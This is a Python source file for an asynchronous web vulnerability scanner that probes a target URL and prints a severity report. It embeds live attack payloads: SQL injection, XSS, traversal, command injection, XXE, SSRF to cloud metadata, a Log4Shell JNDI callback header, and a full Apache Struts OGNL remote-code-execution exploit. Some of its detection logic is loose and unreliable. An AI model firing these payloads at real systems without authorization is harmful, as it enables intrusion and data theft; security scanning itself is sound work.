#!/usr/bin/env python3
"""
Allow Web Security Scanner - Enterprise Edition v3.1
Fully Compatible with Linux Systems
"""

import argparse
import asyncio
import aiohttp
import dns.asyncresolver
import re
import socket
import ssl
import sys
import time
from datetime import datetime
from termcolor import colored
from tqdm import tqdm
from urllib.parse import urlparse, urljoin, quote
from user_agent import generate_user_agent
import os

# Fix for Linux SSL certificate verification
os.environ['SSL_CERT_FILE'] = '/etc/ssl/certs/ca-certificates.crt'

class AllowScanner:
    def __init__(self, target_url, output_file=None, concurrency=20):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.output_file = output_file
        self.concurrency = concurrency
        self.session = None
        self.vulnerabilities = []
        self.technologies = []
        self.security_headers = {}
        self.certificate_info = {}
        self.dns_records = {}
        self.load_time = datetime.now()
        self.scan_duration = 0
        self.progress = {}
        self.load_signatures()
        self.total_checks = len(self.signatures['vulnerability_checks'])
        self.completed_checks = 0

    def load_signatures(self):
        """Load vulnerability signatures"""
        self.signatures = {
            "vulnerability_checks": [
                {"name": "SQL Injection", "method": "GET", "path": "?id={payload}", "payloads": ["'", "1' OR '1'='1", "1\" OR \"1\"=\"1"]},
                {"name": "XSS", "method": "GET", "path": "?search={payload}", "payloads": ["<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>"]},
                {"name": "Directory Traversal", "method": "GET", "path": "{payload}", "payloads": ["../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd"]},
                {"name": "Command Injection", "method": "GET", "path": "?cmd={payload}", "payloads": [";id", "|id", "`id`"]},
                {"name": "XXE", "method": "POST", "path": "api/xml", "payloads": ["""<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>"""]},
                {"name": "SSRF", "method": "GET", "path": "api/fetch?url={payload}", "payloads": ["http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"]},
                {"name": "Open Redirect", "method": "GET", "path": "redirect?url={payload}", "payloads": ["https://evil.com", "//evil.com"]},
                {"name": "Path Traversal", "method": "GET", "path": "download?file={payload}", "payloads": ["../../../etc/passwd"]},
                {"name": "File Inclusion", "method": "GET", "path": "?page={payload}", "payloads": ["php://filter/convert.base64-encode/resource=index.php", "/etc/passwd"]},
                {"name": "Template Injection", "method": "GET", "path": "?name={payload}", "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]},
                {"name": "Log4Shell", "method": "GET", "path": "", "headers": {"User-Agent": "${jndi:ldap://log4j-scanner.check/}"}, "payloads": []},
            ],
            "admin_panels": [
                "/admin", "/wp-admin", "/administrator", "/login", 
                "/cpanel", "/manager", "/admin.php", "/backend", 
                "/controlpanel", "/dashboard", "/admincp", "/adm"
            ],
            "sensitive_files": [
                "/.env", "/.git/config", "/.htaccess", "/config.php", 
                "/web.config", "/robots.txt", "/sitemap.xml", "/phpinfo.php",
                "/server-status", "/.well-known/security.txt"
            ],
            "backup_extensions": [".bak", ".backup", ".old", ".orig", ".swp", ".save"],
            "technology_signatures": {
                "WordPress": ["wp-content", "wp-includes", "wordpress"],
                "Joomla": ["joomla", "Joomla! is Free Software"],
                "Drupal": ["Drupal.settings", "drupal.js"],
                "Laravel": ["laravel", "csrf-token"],
                "Express": ["express", "X-Powered-By: Express"],
                "Ruby on Rails": ["rails", "csrf-token"],
                "Django": ["django", "csrfmiddlewaretoken"],
                "Spring Boot": ["spring", "X-Application-Context"],
                "Nginx": ["nginx", "Server: nginx"],
                "Apache": ["apache", "Server: Apache"]
            },
            "malware_signatures": {
                "WebShell": ["r57shell", "c99shell", "b374k", "wso", "WebShell", "eval\\(base64_decode"],
                "Skimmer": ["magecart", "creditCard", "cardNumber", "paymentMethod"],
                "Ransomware": ["encrypted", "decrypt", "ransom", "bitcoin", "cryptolocker"],
                "Botnet": ["mirai", "gafgyt", "tsunami", "shellbot"]
            },
            "cve_checks": {
                "CVE-2021-44228": {
                    "name": "Log4Shell",
                    "method": "GET",
                    "headers": {"User-Agent": "${jndi:ldap://{domain}/}"},
                    "detection": "dns_callback"
                },
                "CVE-2017-5638": {
                    "name": "Apache Struts RCE",
                    "method": "POST",
                    "path": "/struts2-showcase/",
                    "headers": {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"},
                    "payload": """------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="image"

%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
------WebKitFormBoundary7MA4YWxkTrZu0gW--"""
                }
            }
        }

    async def run_scan(self):
        """Main method to run all security checks"""
        start_time = time.time()
        
        print(colored(f"\n🔍 Starting Allow Security Scan for {self.target_url}", "cyan", attrs=["bold"]))
        print(colored(f"⏱️ Scan started at: {self.load_time.strftime('%Y-%m-%d %H:%M:%S')}", "blue"))
        
        # Create aiohttp session with SSL context fix for Linux
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        connector = aiohttp.TCPConnector(ssl=ssl_context, limit=self.concurrency)
        self.session = aiohttp.ClientSession(
            connector=connector,
            headers={'User-Agent': generate_user_agent()},
            timeout=aiohttp.ClientTimeout(total=30)
        )
        
        try:
            # Run checks concurrently
            tasks = [
                self.detect_technologies(),
                self.check_vulnerabilities(),
                self.check_sensitive_files(),
                self.check_admin_panels(),
                self.check_ssl_security(),
                self.check_dns_security(),
                self.check_security_headers(),
                self.check_cves(),
                self.check_backup_files(),
                self.check_malware_signatures()
            ]
            
            # Use tqdm for progress tracking
            with tqdm(total=len(tasks), desc="Scan Progress", unit="task") as pbar:
                for task in asyncio.as_completed(tasks):
                    try:
                        await task
                    except Exception as e:
                        print(colored(f"\n⚠️ Error during scan: {str(e)}", "red"))
                    pbar.update(1)
        finally:
            # Ensure session is always closed
            await self.session.close()
        
        # Calculate scan duration
        self.scan_duration = time.time() - start_time
        
        # Generate report
        self.report_results()
        
        print(colored(f"\n✅ Scan completed in {self.scan_duration:.2f} seconds", "green", attrs=["bold"]))
        print(colored(f"📋 Found {len(self.vulnerabilities)} potential vulnerabilities", "yellow"))

    async def fetch_url(self, url, method="GET", headers=None, data=None, allow_redirects=True):
        """Fetch a URL with error handling"""
        try:
            async with self.session.request(
                method, 
                url, 
                headers=headers, 
                data=data, 
                allow_redirects=allow_redirects
            ) as response:
                content = await response.text()
                return response, content
        except Exception as e:
            return None, str(e)

    async def detect_technologies(self):
        """Detect web technologies in use"""
        try:
            response, content = await self.fetch_url(self.target_url)
            if not response:
                return
                
            # Detect from headers
            server_header = response.headers.get('Server', '')
            if server_header:
                for tech, patterns in self.signatures['technology_signatures'].items():
                    if any(p.lower() in server_header.lower() for p in patterns):
                        self.technologies.append(tech)
                        break
            
            # Detect from content
            for tech, patterns in self.signatures['technology_signatures'].items():
                if any(re.search(p, content, re.IGNORECASE) for p in patterns):
                    if tech not in self.technologies:
                        self.technologies.append(tech)
            
            # Detect from cookies
            for cookie in response.cookies.values():
                cookie_key = cookie.key.lower()
                if 'wordpress' in cookie_key:
                    if 'WordPress' not in self.technologies:
                        self.technologies.append('WordPress')
                elif 'drupal' in cookie_key:
                    if 'Drupal' not in self.technologies:
                        self.technologies.append('Drupal')
            
            # Detect from meta tags
            if '<meta' in content:
                if 'name="generator"' in content:
                    if 'wordpress' in content.lower():
                        self.technologies.append('WordPress')
                    elif 'joomla' in content.lower():
                        self.technologies.append('Joomla')
                    elif 'drupal' in content.lower():
                        self.technologies.append('Drupal')
        except Exception as e:
            print(colored(f"Error in technology detection: {str(e)}", "yellow"))

    async def check_vulnerabilities(self):
        """Check for various web vulnerabilities"""
        try:
            semaphore = asyncio.Semaphore(self.concurrency)
            
            async def run_check(check):
                async with semaphore:
                    if "payloads" in check and check["payloads"]:
                        for payload in check["payloads"]:
                            # Format URL with payload
                            url = self.target_url + check["path"].format(payload=quote(payload))
                            
                            # Prepare request
                            method = check.get("method", "GET")
                            headers = check.get("headers", {})
                            data = payload if method == "POST" else None
                            
                            # Send request
                            response, content = await self.fetch_url(
                                url, method=method, headers=headers, data=data
                            )
                            
                            # Skip if no response
                            if not response:
                                continue
                                
                            # Check for vulnerability indicators
                            if response.status == 200:
                                if check["name"] == "SQL Injection" and any(
                                    err in content for err in ["SQL syntax", "mysql_fetch", "syntax error"]
                                ):
                                    self.vulnerabilities.append({
                                        "type": check["name"],
                                        "url": url,
                                        "severity": "Critical",
                                        "payload": payload
                                    })
                                elif check["name"] == "XSS" and payload in content:
                                    self.vulnerabilities.append({
                                        "type": check["name"],
                                        "url": url,
                                        "severity": "High",
                                        "payload": payload
                                    })
                                elif check["name"] == "Directory Traversal" and "root:" in content:
                                    self.vulnerabilities.append({
                                        "type": check["name"],
                                        "url": url,
                                        "severity": "High",
                                        "payload": payload
                                    })
            
            tasks = [run_check(check) for check in self.signatures["vulnerability_checks"]]
            await asyncio.gather(*tasks)
        except Exception as e:
            print(colored(f"Error in vulnerability checks: {str(e)}", "yellow"))

    async def check_admin_panels(self):
        """Check for exposed admin panels"""
        try:
            tasks = []
            for path in self.signatures["admin_panels"]:
                url = urljoin(self.target_url, path)
                tasks.append(self.fetch_url(url))
            
            responses = await asyncio.gather(*tasks)
            
            for path, (response, content) in zip(self.signatures["admin_panels"], responses):
                if response and response.status == 200:
                    content_lower = content.lower()
                    if "login" in content_lower or "password" in content_lower:
                        self.vulnerabilities.append({
                            "type": "Exposed Admin Panel",
                            "url": urljoin(self.target_url, path),
                            "severity": "Medium",
                            "payload": None
                        })
        except Exception as e:
            print(colored(f"Error in admin panel check: {str(e)}", "yellow"))

    async def check_sensitive_files(self):
        """Check for sensitive files"""
        try:
            tasks = []
            for path in self.signatures["sensitive_files"]:
                url = urljoin(self.target_url, path)
                tasks.append(self.fetch_url(url))
            
            responses = await asyncio.gather(*tasks)
            
            for path, (response, content) in zip(self.signatures["sensitive_files"], responses):
                if response and response.status == 200:
                    self.vulnerabilities.append({
                        "type": "Sensitive File Exposure",
                        "url": urljoin(self.target_url, path),
                        "severity": "Low",
                        "payload": None
                    })
                    # Special handling for specific files
                    if path == "/.env" and "DB_PASSWORD" in content:
                        self.vulnerabilities.append({
                            "type": "Credentials Exposure",
                            "url": urljoin(self.target_url, path),
                            "severity": "Critical",
                            "payload": None
                        })
                    elif path == "/phpinfo.php" and "phpinfo()" in content:
                        self.vulnerabilities.append({
                            "type": "PHPInfo Exposure",
                            "url": urljoin(self.target_url, path),
                            "severity": "Medium",
                            "payload": None
                        })
        except Exception as e:
            print(colored(f"Error in sensitive files check: {str(e)}", "yellow"))

    async def check_backup_files(self):
        """Check for backup files"""
        try:
            tasks = []
            # Check for backup files of sensitive files
            for path in self.signatures["sensitive_files"]:
                for ext in self.signatures["backup_extensions"]:
                    url = urljoin(self.target_url, path + ext)
                    tasks.append(self.fetch_url(url))
            
            # Check for common backup patterns
            backup_patterns = [
                "backup", "database", "dump", "archive", 
                "www", "site", "web", "app"
            ]
            for pattern in backup_patterns:
                for ext in self.signatures["backup_extensions"]:
                    url = urljoin(self.target_url, f"{pattern}{ext}")
                    tasks.append(self.fetch_url(url))
            
            responses = await asyncio.gather(*tasks)
            
            for response, _ in responses:
                if response and response.status == 200:
                    self.vulnerabilities.append({
                        "type": "Backup File Exposure",
                        "url": str(response.url),
                        "severity": "Medium",
                        "payload": None
                    })
        except Exception as e:
            print(colored(f"Error in backup files check: {str(e)}", "yellow"))

    async def check_security_headers(self):
        """Check for security headers"""
        try:
            response, content = await self.fetch_url(self.target_url)
            if not response:
                return
            
            headers_to_check = {
                "Content-Security-Policy": "Missing CSP header",
                "X-Content-Type-Options": "Missing X-Content-Type-Options header",
                "X-Frame-Options": "Missing X-Frame-Options header",
                "Strict-Transport-Security": "Missing HSTS header",
                "X-XSS-Protection": "Missing X-XSS-Protection header",
                "Referrer-Policy": "Missing Referrer-Policy header",
                "Permissions-Policy": "Missing Permissions-Policy header"
            }
            
            for header, message in headers_to_check.items():
                if header not in response.headers:
                    self.vulnerabilities.append({
                        "type": "Security Header Missing",
                        "url": self.target_url,
                        "severity": "Low",
                        "payload": header
                    })
                else:
                    self.security_headers[header] = response.headers[header]
                    
                    # Check for insecure values
                    if header == "X-XSS-Protection" and "0" in response.headers[header]:
                        self.vulnerabilities.append({
                            "type": "Insecure X-XSS-Protection",
                            "url": self.target_url,
                            "severity": "Medium",
                            "payload": response.headers[header]
                        })
            
            # Check for insecure CSP
            if "Content-Security-Policy" in response.headers:
                csp = response.headers["Content-Security-Policy"]
                if "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
                    self.vulnerabilities.append({
                        "type": "Insecure CSP Policy",
                        "url": self.target_url,
                        "severity": "Medium",
                        "payload": csp
                    })
        except Exception as e:
            print(colored(f"Error in security headers check: {str(e)}", "yellow"))

    async def check_ssl_security(self):
        """Check SSL/TLS configuration"""
        try:
            hostname = urlparse(self.target_url).hostname
            port = 443
            
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            
            # Connect to server
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    # Extract certificate info
                    issuer = dict(x[0] for x in cert.get('issuer', []))
                    subject = dict(x[0] for x in cert.get('subject', []))
                    
                    self.certificate_info = {
                        "issuer": issuer,
                        "subject": subject,
                        "notBefore": cert.get('notBefore', 'Unknown'),
                        "notAfter": cert.get('notAfter', 'Unknown'),
                        "cipher": cipher[0] if cipher else 'Unknown',
                        "protocol": ssock.version()
                    }
                    
                    # Check certificate expiration
                    if 'notAfter' in cert:
                        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_left = (not_after - datetime.now()).days
                        if days_left < 30:
                            self.vulnerabilities.append({
                                "type": "SSL Certificate Expiring Soon",
                                "url": self.target_url,
                                "severity": "Medium",
                                "payload": f"Expires in {days_left} days"
                            })
                    
                    # Check for weak ciphers
                    if cipher:
                        weak_ciphers = ["DES", "RC4", "NULL", "MD5", "EXPORT", "TLSv1", "TLSv1.1"]
                        if any(c in cipher[0] for c in weak_ciphers):
                            self.vulnerabilities.append({
                                "type": "Weak SSL Cipher",
                                "url": self.target_url,
                                "severity": "High",
                                "payload": cipher[0]
                            })
                    
                    # Check for weak protocols
                    if "TLSv1" in ssock.version() or "SSL" in ssock.version():
                        self.vulnerabilities.append({
                            "type": "Weak SSL Protocol",
                            "url": self.target_url,
                            "severity": "High",
                            "payload": ssock.version()
                        })
        except ssl.SSLError as e:
            self.vulnerabilities.append({
                "type": "SSL/TLS Error",
                "url": self.target_url,
                "severity": "High",
                "payload": str(e)
            })
        except Exception as e:
            self.vulnerabilities.append({
                "type": "Connection Error",
                "url": self.target_url,
                "severity": "Medium",
                "payload": str(e)
            })

    async def check_dns_security(self):
        """Check DNS security settings"""
        try:
            # Check for DNSSEC
            resolver = dns.asyncresolver.Resolver()
            try:
                answers = await resolver.resolve(self.base_domain, 'DNSKEY')
                self.dns_records['dnssec'] = bool(answers)
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                self.dns_records['dnssec'] = False
                
            if not self.dns_records['dnssec']:
                self.vulnerabilities.append({
                    "type": "DNSSEC Not Enabled",
                    "url": self.base_domain,
                    "severity": "Medium",
                    "payload": "DNS spoofing possible"
                })
            
            # Check for SPF, DMARC
            spf_found = False
            dmarc_found = False
            
            try:
                answers = await resolver.resolve(self.base_domain, 'TXT')
                for record in answers:
                    record_str = str(record)
                    if "v=spf1" in record_str:
                        spf_found = True
                    if "v=DMARC1" in record_str:
                        dmarc_found = True
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                pass
            
            self.dns_records['spf'] = spf_found
            self.dns_records['dmarc'] = dmarc_found
            
            if not spf_found:
                self.vulnerabilities.append({
                    "type": "SPF Record Missing",
                    "url": self.base_domain,
                    "severity": "Medium",
                    "payload": "Email spoofing possible"
                })
            if not dmarc_found:
                self.vulnerabilities.append({
                    "type": "DMARC Record Missing",
                    "url": self.base_domain,
                    "severity": "Medium",
                    "payload": "Email security vulnerability"
                })
        except Exception as e:
            self.vulnerabilities.append({
                "type": "DNS Error",
                "url": self.base_domain,
                "severity": "Low",
                "payload": str(e)
            })

    async def check_malware_signatures(self):
        """Check for malware signatures in content"""
        try:
            response, content = await self.fetch_url(self.target_url)
            if not response:
                return
                
            content_lower = content.lower()
            for malware_type, signatures in self.signatures["malware_signatures"].items():
                for signature in signatures:
                    if re.search(signature, content_lower):
                        self.vulnerabilities.append({
                            "type": f"Malware Signature Detected",
                            "url": self.target_url,
                            "severity": "Critical",
                            "payload": f"{malware_type}: {signature}"
                        })
        except Exception as e:
            print(colored(f"Error in malware signature check: {str(e)}", "yellow"))

    async def check_cves(self):
        """Check for specific CVEs"""
        try:
            for cve_id, cve_data in self.signatures["cve_checks"].items():
                url = urljoin(self.target_url, cve_data.get("path", ""))
                method = cve_data.get("method", "GET")
                headers = cve_data.get("headers", {})
                data = cve_data.get("payload", None)
                
                # Replace placeholders safely
                if headers and "domain" in str(headers):
                    try:
                        headers = {k: v.format(domain="detect.allow-scanner.io") for k, v in headers.items()}
                    except Exception as e:
                        print(colored(f"Error formatting headers for {cve_id}: {str(e)}", "yellow"))
                
                response, content = await self.fetch_url(
                    url, method=method, headers=headers, data=data
                )
                
                if response and response.status == 200:
                    if cve_data.get("detection") == "dns_callback":
                        self.vulnerabilities.append({
                            "type": f"Potential {cve_id} (Log4Shell)",
                            "url": url,
                            "severity": "Critical",
                            "payload": cve_id
                        })
                    elif "whoami" in content or "root" in content:
                        self.vulnerabilities.append({
                            "type": f"Potential {cve_id} (Apache Struts RCE)",
                            "url": url,
                            "severity": "Critical",
                            "payload": cve_id
                        })
        except Exception as e:
            print(colored(f"Error in CVE checks: {str(e)}", "yellow"))

    def report_results(self):
        """Generate comprehensive scan report"""
        print("\n" + "=" * 80)
        print(colored("🔒 SECURITY SCAN REPORT", "cyan", attrs=["bold"]))
        print("=" * 80)
        
        # Target Information
        print(colored("\n🔎 TARGET INFORMATION", "yellow"))
        print(f"URL: {self.target_url}")
        print(f"Domain: {self.base_domain}")
        print(f"Scan Date: {self.load_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Scan Duration: {self.scan_duration:.2f} seconds")
        
        # Detected Technologies
        if self.technologies:
            print(colored("\n🛠️ DETECTED TECHNOLOGIES", "yellow"))
            print(", ".join(self.technologies))
        
        # Security Headers
        if self.security_headers:
            print(colored("\n🛡️ SECURITY HEADERS", "yellow"))
            for header, value in self.security_headers.items():
                print(f"{header}: {value}")
        
        # SSL/TLS Information
        if self.certificate_info:
            print(colored("\n🔐 SSL/TLS INFORMATION", "yellow"))
            print(f"Issuer: {self.certificate_info.get('issuer', {}).get('organizationName', 'Unknown')}")
            print(f"Subject: {self.certificate_info.get('subject', {}).get('commonName', 'Unknown')}")
            print(f"Valid From: {self.certificate_info.get('notBefore', 'Unknown')}")
            print(f"Valid Until: {self.certificate_info.get('notAfter', 'Unknown')}")
            print(f"Protocol: {self.certificate_info.get('protocol', 'Unknown')}")
            print(f"Cipher: {self.certificate_info.get('cipher', 'Unknown')}")
        
        # DNS Security
        if self.dns_records:
            print(colored("\n🌐 DNS SECURITY", "yellow"))
            print(f"DNSSEC: {'Enabled' if self.dns_records.get('dnssec') else 'Disabled'}")
            print(f"SPF: {'Found' if self.dns_records.get('spf') else 'Missing'}")
            print(f"DMARC: {'Found' if self.dns_records.get('dmarc') else 'Missing'}")
        
        # Vulnerability Report
        if self.vulnerabilities:
            print(colored("\n⚠️ VULNERABILITIES FOUND", "red", attrs=["bold"]))
            
            # Group vulnerabilities by severity
            vuln_by_severity = {"Critical": [], "High": [], "Medium": [], "Low": []}
            for vuln in self.vulnerabilities:
                vuln_by_severity[vuln["severity"]].append(vuln)
            
            # Print vulnerabilities by severity
            for severity in ["Critical", "High", "Medium", "Low"]:
                if vuln_by_severity[severity]:
                    print(f"\n{colored(severity.upper() + ' SEVERITY', 'red' if severity in ['Critical','High'] else 'yellow')}")
                    for vuln in vuln_by_severity[severity]:
                        print(f"• [{severity}] {vuln['type']}")
                        print(f"  URL: {vuln['url']}")
                        if vuln['payload']:
                            print(f"  Payload: {vuln['payload']}")
                        print()
        else:
            print(colored("\n✅ NO VULNERABILITIES FOUND", "green", attrs=["bold"]))
        
        # Recommendations
        if self.vulnerabilities:
            print(colored("\n🔧 RECOMMENDATIONS", "green"))
            print("1. Immediately address Critical and High severity vulnerabilities")
            print("2. Update all software components to their latest versions")
            print("3. Implement a Web Application Firewall (WAF)")
            print("4. Conduct regular security scans and penetration tests")
            print("5. Follow the OWASP Top 10 security guidelines")
        
        print("\n" + "=" * 80)
        print(colored("Scan completed successfully. Always practice responsible disclosure.", "cyan"))
        print("=" * 80)
        
        # Save to file if requested
        if self.output_file:
            with open(self.output_file, "w") as f:
                f.write(self.generate_text_report())
            print(f"\nReport saved to: {self.output_file}")

    def generate_text_report(self):
        """Generate text report for file output"""
        report = f"Allow Security Scan Report\n"
        report += "=" * 50 + "\n\n"
        report += f"Target URL: {self.target_url}\n"
        report += f"Scan Date: {self.load_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Scan Duration: {self.scan_duration:.2f} seconds\n\n"
        
        if self.technologies:
            report += "Detected Technologies:\n"
            report += ", ".join(self.technologies) + "\n\n"
        
        if self.vulnerabilities:
            report += "Vulnerabilities Found:\n"
            report += "=" * 50 + "\n"
            
            for vuln in self.vulnerabilities:
                report += f"[{vuln['severity']}] {vuln['type']}\n"
                report += f"URL: {vuln['url']}\n"
                if vuln['payload']:
                    report += f"Payload: {vuln['payload']}\n"
                report += "\n"
        else:
            report += "No vulnerabilities found.\n\n"
        
        report += "\nRecommendations:\n"
        report += "- Address critical vulnerabilities immediately\n"
        report += "- Keep all software components updated\n"
        report += "- Implement a Web Application Firewall (WAF)\n"
        report += "- Conduct regular security audits\n"
        report += "- Follow OWASP security best practices\n"
        
        report += "\n" + "=" * 50 + "\n"
        report += "Generated by Allow Advanced Web Security Scanner\n"
        
        return report

def main():
    parser = argparse.ArgumentParser(
        description="🛡️ Allow Scanner - Advanced Web Vulnerability Scanner",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("-c", "--concurrency", type=int, default=20, 
                       help="Number of concurrent requests")
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(("http://", "https://")):
        print(colored("❌ Error: URL must start with http:// or https://", "red"))
        sys.exit(1)
    
    # Create and run scanner
    scanner = AllowScanner(
        target_url=args.url,
        output_file=args.output,
        concurrency=args.concurrency
    )
    
    # Run the scan
    asyncio.run(scanner.run_scan())

if __name__ == "__main__":
    # ASCII Art Banner
    print(colored(r"""
     _    _ _           _     _____                                 
    / \  | | | _____  _| |   / ____|    _                           
   / _ \ | | |/ _ \ \/ / |  | |   _   _| |_ ___  _ __ ___   ___  ___
  / ___ \| | |  __/>  <| |  | |  | | | | __/ _ \| '_ ` _ \ / _ \/ __|
 /_/   \_\_|_|\___/_/\_\_|  | |__| |_| | || (_) | | | | | |  __/\__ \
                             \_____\__,_|\__\___/|_| |_| |_|\___||___/
    """, "cyan"))
    
    print(colored("Allow Web Security Scanner | Enterprise Edition v3.1", "blue", attrs=["bold"]))
    print(colored("Fully Compatible with Linux Systems", "magenta"))
    print(colored("======================================", "cyan"))
    
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n❌ Scan interrupted by user", "red"))
        sys.exit(1)
    except Exception as e:
        print(colored(f"\n❌ Unexpected error: {str(e)}", "red"))
        sys.exit(1)
